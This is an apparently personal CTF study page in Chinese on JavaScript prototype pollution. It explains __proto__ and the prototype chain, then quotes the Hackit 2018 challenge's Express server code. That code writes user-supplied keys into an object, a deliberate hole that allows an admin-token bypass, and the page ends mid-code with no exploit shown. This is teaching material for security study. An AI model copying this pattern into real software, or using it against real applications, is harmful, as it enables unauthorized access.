@@ -1,0 +1,1540 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="ja">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.0">
+    
+    
+      
+        <title>原型链污染攻击 - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.0284f74d.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.01803549.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700|Source+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#_1" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="My Docs" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              My Docs
+            </span>
+            <span class="md-header-nav__topic">
+              
+                原型链污染攻击
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." title="Welcome to MkDocs" class="md-tabs__link">
+        Welcome to MkDocs
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../MISC/" title="MISC" class="md-tabs__link">
+          MISC
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../SQL/" title="SQL" class="md-tabs__link">
+          SQL
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../XSS/" title="XSS" class="md-tabs__link">
+          XSS
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../" title="Audit" class="md-tabs__link md-tabs__link--active">
+          Audit
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../basic/ch0/" title="Basic" class="md-tabs__link">
+          Basic
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../upload/" title="Upload" class="md-tabs__link">
+          Upload
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../web/" title="Web" class="md-tabs__link">
+          Web
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../writeup/" title="Writeup" class="md-tabs__link">
+          Writeup
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="My Docs" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Welcome to MkDocs" class="md-nav__link">
+      Welcome to MkDocs
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      MISC
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        MISC
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/" title="一些常见的MISC姿势" class="md-nav__link">
+      一些常见的MISC姿势
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/JPEG/" title="JPEG格式的图片隐写" class="md-nav__link">
+      JPEG格式的图片隐写
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch0/" title="常见文件格式" class="md-nav__link">
+      常见文件格式
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch1/" title="USB流量分析" class="md-nav__link">
+      USB流量分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch2/" title="Ch2" class="md-nav__link">
+      Ch2
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch3/" title="python沙盒" class="md-nav__link">
+      python沙盒
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch4/" title="常用工具" class="md-nav__link">
+      常用工具
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      SQL
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        SQL
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../SQL/" title="SQL注入" class="md-nav__link">
+      SQL注入
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../SQL/blindSQL/" title="blindSQL" class="md-nav__link">
+      blindSQL
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../SQL/ch0/" title="sql注入姿势积累" class="md-nav__link">
+      sql注入姿势积累
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../SQL/ch1/" title="SQL姿势" class="md-nav__link">
+      SQL姿势
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      XSS
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        XSS
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../XSS/" title="XSS" class="md-nav__link">
+      XSS
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" checked>
+    
+    <label class="md-nav__link" for="nav-5">
+      Audit
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Audit
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../" title="代码审计" class="md-nav__link">
+      代码审计
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../audit0/" title="审计小知识" class="md-nav__link">
+      审计小知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../audit1/" title="文件包含常见姿势" class="md-nav__link">
+      文件包含常见姿势
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../audit2/" title="Audit2" class="md-nav__link">
+      Audit2
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../audit3/" title="php反射" class="md-nav__link">
+      php反射
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../audit4/" title="PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患" class="md-nav__link">
+      PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../audit5/" title="利用`phar`扩展PHP反序列化漏洞攻击面" class="md-nav__link">
+      利用`phar`扩展PHP反序列化漏洞攻击面
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../audit6/" title="审计小知识" class="md-nav__link">
+      审计小知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../audit7/" title="审计小知识" class="md-nav__link">
+      审计小知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../code-breaking/" title="code-breaking" class="md-nav__link">
+      code-breaking
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../easyphp/" title="Easyphp" class="md-nav__link">
+      Easyphp
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../example/" title="example" class="md-nav__link">
+      example
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../function/" title="php常用函数" class="md-nav__link">
+      php常用函数
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../java/" title="从反序列化到命令执行 - Java 中的 POP 执行链" class="md-nav__link">
+      从反序列化到命令执行 - Java 中的 POP 执行链
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+    <a href="./" title="原型链污染攻击" class="md-nav__link md-nav__link--active">
+      原型链污染攻击
+    </a>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../nodejs/" title="Nodejs" class="md-nav__link">
+      Nodejs
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../php-challenge/" title="记录php代码审计的小trick" class="md-nav__link">
+      记录php代码审计的小trick
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../反序列化/" title="反序列化" class="md-nav__link">
+      反序列化
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      Basic
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        Basic
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../basic/ch0/" title="准备工作" class="md-nav__link">
+      准备工作
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      Upload
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        Upload
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../upload/" title="文件上传" class="md-nav__link">
+      文件上传
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../upload/ch0/" title="PHP实现文件上传" class="md-nav__link">
+      PHP实现文件上传
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../upload/ch1/" title=".user.ini构成的后门" class="md-nav__link">
+      .user.ini构成的后门
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../upload/ch2/" title=".htaccess构成的后门" class="md-nav__link">
+      .htaccess构成的后门
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
+    
+    <label class="md-nav__link" for="nav-8">
+      Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-8">
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/" title="Web基础知识" class="md-nav__link">
+      Web基础知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/LFI/" title="本地文件包含" class="md-nav__link">
+      本地文件包含
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/blindXXE/" title="[Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)" class="md-nav__link">
+      [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/web0/" title="CRLF漏洞" class="md-nav__link">
+      CRLF漏洞
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
+    
+    <label class="md-nav__link" for="nav-9">
+      Writeup
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-9">
+        Writeup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/" title="writeup" class="md-nav__link">
+      writeup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/BUUCTF/" title="BUUCTF" class="md-nav__link">
+      BUUCTF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/Bypassing/" title="Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up" class="md-nav__link">
+      Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/Ogeek/" title="Ogeek" class="md-nav__link">
+      Ogeek
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/TokyoCTF/" title="东京CTF wp2018" class="md-nav__link">
+      东京CTF wp2018
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/bugku/" title="bugku" class="md-nav__link">
+      bugku
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/dianfengjike2018/" title="巅峰极客" class="md-nav__link">
+      巅峰极客
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/fivespace/" title="第五空间" class="md-nav__link">
+      第五空间
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/hackcon2019/" title="hackcon2019" class="md-nav__link">
+      hackcon2019
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/new-bugku/" title="newBugku" class="md-nav__link">
+      newBugku
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="_1">原型链污染攻击<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<div class="codehilite"><pre><span></span>&gt;  let obj = {};
+&lt;· undefined
+&gt;  obj.__proto__;
+&lt;· {constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}
+</pre></div>
+
+<p>而经过不断的调用,最终的原型对象会调用到null,这将作为该原型链的最后一个环节,与之对应的,作为终点的null自然也是没有原型对象的。比如,我们继续在上面的例子中调用其原型对象:</p>
+<blockquote>
+<p>obj.<strong>proto</strong>.<strong>proto</strong>;
+&lt;· null</p>
+</blockquote>
+<p>在Javascript中可以通过example.a.b或example.a["b"]来对数组进行访问,example.a访问的是example对象下的a对象的b,而example.a["b"]则是访问example对象下的a数组的下标为b的值。</p>
+<p>由于对象是无序的,当使用第二种方式访问对象时,只能使用指明下标的方式去访问。</p>
+<p>因此我们可以通过a["<strong>proto</strong>"]的方式去访问其原型对象。</p>
+<h1 id="_2">实例<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<h2 id="hackit-2018">Hackit 2018<a class="headerlink" href="#hackit-2018" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">)</span>
+<span class="kd">var</span> <span class="nx">hbs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;hbs&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;body-parser&#39;</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">md5</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">morganBody</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;morgan-body&#39;</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">[];</span> <span class="c1">//empty for now</span>
+
+<span class="kd">var</span> <span class="nx">matrix</span> <span class="o">=</span> <span class="p">[];</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="nx">matrix</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="kc">null</span> <span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">draw</span><span class="p">(</span><span class="nx">mat</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">){</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">matrix</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="nx">j</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">){</span>
+                <span class="nx">count</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">count</span> <span class="o">===</span> <span class="mi">9</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">&#39;/static&#39;</span><span class="p">,</span> <span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;view engine&#39;</span><span class="p">,</span> <span class="s1">&#39;html&#39;</span><span class="p">);</span>
+<span class="nx">morganBody</span><span class="p">(</span><span class="nx">app</span><span class="p">);</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">engine</span><span class="p">(</span><span class="s1">&#39;html&#39;</span><span class="p">,</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;hbs&#39;</span><span class="p">).</span><span class="nx">__express</span><span class="p">);</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="nx">matrix</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="kc">null</span> <span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">];</span>
+
+    <span class="p">}</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">);</span>
+<span class="p">})</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="cm">/*this is under development I guess ??*/</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">admintoken</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">querytoken</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">admintoken</span><span class="p">)</span> <span class="o">===</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">querytoken</span><span class="p">){</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Hey admin your flag is &lt;b&gt;flag{prototype_pollution_is_very_dangerous}&lt;/b&gt;&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Forbidden&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="p">)</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/api&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">winner</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">client</span><span class="p">.</span><span class="nx">row</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="o">||</span> <span class="nx">client</span><span class="p">.</span><span class="nx">col</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">){</span>
+        <span class="nx">client</span><span class="p">.</span><span class="nx">row</span> <span class="o">%=</span> <span class="mi">3</span><span class="p">;</span>
+        <span class="nx">client</span><span class="p">.</span><span class="nx">col</span> <span class="o">%=</span> <span class="mi">3</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">matrix</span><span class="p">[</span><span class="nx">client</span><span class="p">.</span><span class="nx">row</span><span class="p">][</span><span class="nx">client</span><span class="p">.</span><span class="nx">col</span><span class="p">]</span> <span class="o">=</span> <span class="nx">client</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">matrix</span><span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
